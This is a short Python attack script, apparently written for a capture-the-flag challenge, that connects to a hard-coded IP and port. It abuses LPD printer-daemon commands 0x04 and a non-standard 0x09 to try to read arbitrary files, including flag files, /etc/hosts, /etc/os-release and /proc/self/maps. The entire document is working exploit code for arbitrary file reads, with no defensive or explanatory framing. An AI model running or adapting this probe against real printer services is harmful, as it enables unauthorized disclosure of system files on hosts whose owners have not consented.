#!/usr/bin/env python3
import socket
import time
import string

TARGET = "94.237.49.23"
PORT = 37326

def try_read(path, cmd=0x04):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        data = bytes([cmd]) + path.encode() + b'\n'
        s.sendall(data)
        time.sleep(0.3)
        
        resp = b''
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return b''

# Intentar nombres de archivo comunes con diferentes comandos LPD
paths = []

# Archivos comunes en sistema
common_files = [
    "/etc/hostname",
    "/etc/hosts",
    "/etc/issue",
    "/etc/os-release",
    "/proc/version",
    "/proc/self/maps",
]

# Archivos en spool LPD
for name in ["flag", ".flag", "FLAG", "flag.txt", ".flag.txt", "status", ".status"]:
    paths.append(f"/var/spool/lpd/{name}")
    paths.append(f"/var/spool/lpd/lp/{name}")

# Root y otras ubicaciones
paths.extend(["/flag", "/flag.txt", "/root/flag", "/root/flag.txt", "/tmp/flag"])

paths.extend(common_files)

print("=== Intentando leer archivos con comando 0x04 ===\n")
for path in paths:
    resp = try_read(path, 0x04)
    if len(resp) > 1 or (len(resp) == 1 and resp != b'\x00'):
        print(f"Path: {path}")
        print(f"  Length: {len(resp)}")
        print(f"  Hex: {resp[:100].hex()}")
        try:
            decoded = resp.decode('utf-8', errors='replace')
            print(f"  Text: {decoded[:300]}")
            print()
        except:
            pass

print("\n=== Intentando con comando 0x09 (no estándar) ===\n")
test_paths = ["/flag", "/flag.txt", "lp", "/var/spool/lpd/flag"]
for path in test_paths:
    resp = try_read(path, 0x09)
    if len(resp) > 1:
        print(f"Path: {path}, Length: {len(resp)}")
        print(f"  Data: {resp[:200]}")